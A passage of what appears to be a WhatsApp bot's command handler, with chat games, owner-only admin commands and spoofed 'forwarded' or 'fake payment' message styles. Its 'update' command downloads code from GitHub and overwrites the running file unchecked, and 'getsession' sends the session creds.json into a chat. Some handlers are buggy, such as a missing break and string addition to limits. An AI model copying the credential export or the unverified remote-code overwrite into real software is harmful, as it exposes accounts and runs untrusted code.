                delete kuismath[m.sender.split('@')[0]]
            } else newReply('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // newReply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                newReply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) ToxxicTechInc.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            ToxxicTechInc.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    ToxxicTechInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    ToxxicTechInc.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) ToxxicTechInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) ToxxicTechInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) ToxxicTechInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    ToxxicTechInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    newReply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) ToxxicTechInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    newReply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) ToxxicTechInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    ToxxicTechInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
        
        //user db
        if (isCommand && !isUser) {
Toxxicverifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(Toxxicverifieduser, null, 2))
}
        if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('queenrias.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('An error occurred:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `[INVAILD COMMAND]\n\n\n\nMaybe this is what you meant:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
newReply(response)
}}
        switch (isCommand) {
        	case 'socialmedia': 
        case 'sosmed': {
	const slides = [
    [
        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Title
        `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://youtube.com/@anime_kun15', // Command (URL in this case)
        'cta_url', // Button type
        'https://youtube.com/@anime_kun15' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        `Susbcribe Developer's Telegram Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'http://t.me/Toxxicn_bot', // Command (URL in this case)
        'cta_url', // Button type
        'http://t.me/Toxxicn_bot' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        `Follow Developer On GitHub`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/Toxic1239', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/Toxic1239' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
        '', // Title
        `Follow Developer On Instagram`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://www.instagram.com/toxxicedits', // Command (URL in this case)
        'cta_url', // Button type
        'https://www.instagram.com/toxxicedits' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Contact Developer On WhatsApp`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/2348165846414', // Command (URL in this case)
        'cta_url', // Button type
        'https://Wa.me/2348165846414' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_call":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copy":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_location":
                buttonParamsJson = {};
                break;
             case "quick_reply":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: ToxxicTechInc.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
                    }),
                },
            },
        },
        { quoted: m},
    );
    await ToxxicTechInc.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'removed you', ownername, botname, slides);
}
break
            case 'addbadword': case 'addbd':
               if (!isCreator) return ownernya()
               if (!groupAdmins) return newReply(mess.admin)
               if (args.length < 1) return newReply( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               newReply('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!isCreator) return ownernya()
               if (!groupAdmins) return newReply(mess.admin)
               if (args.length < 1) return newReply( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               newReply('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!isCreator) return ownernya()
               let totalusernya = db.data.users[0]
               newReply(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!isCreator) return ownernya()
               global.db.data.settings[botNumber].totalhit = 0
               newReply(mess.done)
            }
            case 'update': {
    if (!isCreator) return ownernya(); // Check if the user has the right permission
    const repoOwner = 'Toxic1239'; // Replace with your GitHub username
    const repoName = 'Queen-RiasV2'; // Replace with your repository name
    const branch = 'main';           // Replace with your branch name if different
    const localDir = './';  // Directory to save downloaded files

    // Create local directory if it doesn't exist
    if (!fs.existsSync(localDir)){
        fs.mkdirSync(localDir);
    }

    // Function to download a file from GitHub
    async function downloadFile(filePath) {
        const rawUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/${branch}/${filePath}`;
        
        try {
            newReply(`Downloading: ${filePath}`); // Inform user about the download process
            const response = await fetch(rawUrl);
            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
            
            const data = await response.text();
            const localFilePath = path.join(localDir, filePath);

            // Ensure the directory exists for nested paths
            fs.mkdirSync(path.dirname(localFilePath), { recursive: true });

            // Save the file locally
            fs.writeFileSync(localFilePath, data, 'utf8');
            newReply(`Successfully updated: ${filePath}`); // Inform user about the success
        } catch (error) {
            newReply(`Error downloading file: ${filePath} - ${error.message}`);
            newReply('Queen Rias V2 Auto Update Failed\nPlease Type .repo and Sync Fork and redeploy the Latest Version!');
        }
    }

    // Example list of files to download
    const filesToDownload = [
        'queenrias.js' // Replace with actual file paths in your repo
    ];

    // Start the update process and notify the user
    newReply('Starting update process...');

    // Download each file
    Promise.all(filesToDownload.map(file => downloadFile(file)))
        .then(() => {
            newReply('Queen Rias V2 Has Automatically Updated To Latest Version');
        })
        .catch(() => {
            newReply('Some files failed to update.');
        });

    break;
}
            break
            case 'setmenu': {
            if (!isCreator) return ownernya()
            if (text.startsWith('v')) {
                  typemenu = text
                  newReply(mess.done)
               } else {
               let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT MENU 🗂️",
"sections":[{"title":"SELECT THE MENU BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"BUTTON + CHANNEL V2",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL V2",
"id":"${prefix+command} v12"},
{"header":"BUTTON + CHANNEL",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL",
"id":"${prefix+command} v11"},
{"header":"ONLY BUTTON",
"title":"CHOOSE ",
"description":"ONLY BUTTON",
"id":"${prefix+command} v10"},
{"header":"CHANNEL + FAKE THUMBNAIL V2",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL V2",
"id":"${prefix+command} v9"},
{"header":"CHANNEL + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL",
"id":"${prefix+command} v8"},
{"header":"FAKE THUMBNAIL + DOCUMENT",
"title":"CHOOSE ",
"description":"FAKE THUMBNAIL + DOCUMENT",
"id":"${prefix+command} v7"},
{"header":"FAKE PAYMENT",
"title":"CHOOSE ",
"description":"FAKE PAYMENT",
"id":"${prefix+command} v6"},
{"header":"CALL SCHEDULE",
"title":"CHOOSE",
"description":"CALL SCHEDULE",
"id":"${prefix+command} v5"},
{"header":"GIF THUMBNAIL",
"title":"CHOOSE",
"description":"GIF THUMBNAIL",
"id":"${prefix+command} v4"},
{"header":"VIDEO THUMBNAIL",
"title":"CHOOSE",
"description":"VIDEO THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"CHANNEL + THUMBNAIL",
"title":"CHOOSE",
"description":"CHANNEL + THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"IMAGE THUMBNAIL",
"title":"CHOOSE",
"description":"IMAGE THUMBNAIL",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
                break 
    case 'gacha-member': {
    let anu = await fetch("https://raw.githubusercontent.com/FallEzz/cekoshi/master/oshi.json")
    let data = await anu.json()
    let selected = data[Math.floor(Math.random() * data.length)]
    await ToxxicTechInc.sendMessage(m.chat, {
        image: { url: selected.image },
        caption: selected.name
    })
    }
break
            case 'setreply':{
               if (!isCreator) return ownernya()
               if (text.startsWith('v')) {
                  typereply = text
                  newReply(mess.done)
               } else {
                  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT REPLY ",
"sections":[{"title":"SELECT THE REPLY BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"CHANNEL + LINK THUMB",
"title":"CHOOSE ",
"description":"CHANNEL + LINK THUMB",
"id":"${prefix+command} v4"},
{"header":"LARGE LINK + THUMBNAIL",
"title":"CHOOSE ",
"description":"LARGE LINK + THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"LINK + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"LINK + FAKE THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"QUOTED NORMALLY",
"title":"CHOOSE ",
"description":"QUOTED NORMALLY",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!isCreator) return ownernya()
               if (!q) return newReply('Text?')
               await ToxxicTechInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               newReply(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!isCreator) return ownernya()
               if (/video/.test(mime)) {
                  var videosw = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                  await ToxxicTechInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await newReply(mess.done)
               } else {
                  newReply('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!isCreator) return ownernya()
               if (/image/.test(mime)) {
                  var imagesw = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                  await ToxxicTechInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await newReply(mess.done)
               } else {
                  newReply('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!isCreator) return ownernya()
               if (/audio/.test(mime)) {
                  var audiosw = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                  await ToxxicTechInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await newReply(mess.done)
               } else {
                  newReply('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!isCreator) return ownernya()
                let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './File/theme/rias.jpg')
                fs.unlinkSync(delb)
                newReply(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!isCreator) return ownernya()
                let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './File/theme/RiasMyLove.mp4')
                fs.unlinkSync(delb)
                newReply(mess.done)
            }
            break
            case 'addtitle':{
               if (!isCreator) return ownernya()
               if (!text) return newReply(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await newReply(mess.done)
            }
            break
            case 'deltitle':{
               if (!isCreator) return ownernya()
               if (!text) return newReply(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await newReply(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!isCreator) return ownernya()
                if (!text) return newReply(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                newReply(mess.done)
            }
            break
            case 'dellimit':{
                if (!isCreator) return ownernya()
                if (!text) return newReply(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return newReply(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                newReply(mess.done)
            }
            break
            case 'addprem':
                if (!isCreator) return ownernya()
                if (args.length < 2)
                    return newReply(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    newReply("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    newReply("Premium Success")
                }
            break
            case 'delprem':
                if (!isCreator) return ownernya()
                if (args.length < 1) return newReply(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 2348165846414`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    }
                    newReply("Delete Success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    newReply("Delete Success")
                }
            break
            case 'listprem': {
                if (!isCreator) return ownernya()
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                ToxxicTechInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!isCreator) return ownernya()
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ToxxicTechInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return newReply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
newReply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!isCreator) return ownernya()
if (!args[0]) return newReply(`Use ${prefix+command} nomor\nExample ${prefix+command} 2348165846414`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
newReply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                newReply(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return ownernya()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return newReply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return newReply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    newReply(teks)
                    await sleep(2000)
                    newReply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    newReply("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return ownernya()
                    if (!text) return newReply('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    ToxxicTechInc.groupAcceptInvite(result)
                    await newReply(`Done`)
                } catch {
                    newReply('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!isCreator) return ownernya()
                newReply('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                ToxxicTechInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!isCreator) return ownernya()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        newReply("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return newReply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                ToxxicTechInc.sendMessage("2348165846414@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            ToxxicTechInc.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'shutdown':
                if (!isCreator) return ownernya()
                newReply(`𝐐𝐔𝐄𝐄𝐍 𝐑𝐈𝐀𝐒 𝐈𝐒 𝐆𝐎𝐍𝐍𝐀 𝐓𝐀𝐊𝐄 𝐀 𝐍𝐀𝐏`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (!isCreator) return ownernya()
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    newReply(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    newReply(`Successfully changed autoread to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
